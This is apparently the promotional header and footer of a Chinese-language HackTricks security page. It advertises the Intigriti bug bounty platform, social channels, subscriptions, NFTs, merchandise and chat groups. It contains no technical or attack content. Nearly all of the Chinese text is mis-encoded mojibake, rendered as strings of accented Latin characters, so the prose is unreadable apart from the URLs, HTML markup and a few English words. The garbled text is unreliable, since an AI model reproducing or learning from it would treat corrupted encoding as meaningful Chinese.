**Bugèµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**Bugèµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šå—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—PEASSçš„**æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
